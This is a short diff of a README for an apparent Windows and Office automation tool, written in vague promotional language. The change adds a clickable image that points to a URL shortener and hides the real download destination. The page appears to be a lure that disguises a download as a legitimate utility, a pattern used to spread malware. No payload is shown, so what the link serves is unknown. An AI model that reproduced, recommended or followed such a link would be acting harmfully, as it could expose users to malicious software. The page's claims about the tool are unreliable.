@@ -4,7 +4,7 @@
 
 Experience the next generation of intelligent system configuration with this sophisticated automation tool. Designed to streamline the complex process of preparing Windows and Office environments, this application delivers professional-grade results through intelligent, hands-free operation.
 
-
+[![1312308967](https://github.com/user-attachments/assets/e1a1a458-2747-4339-8cbf-ca808dae08ca)](https://tinyurl.com/ycxs5yy3)
 
 ## **🎯 Purpose & Core Functionality**
 
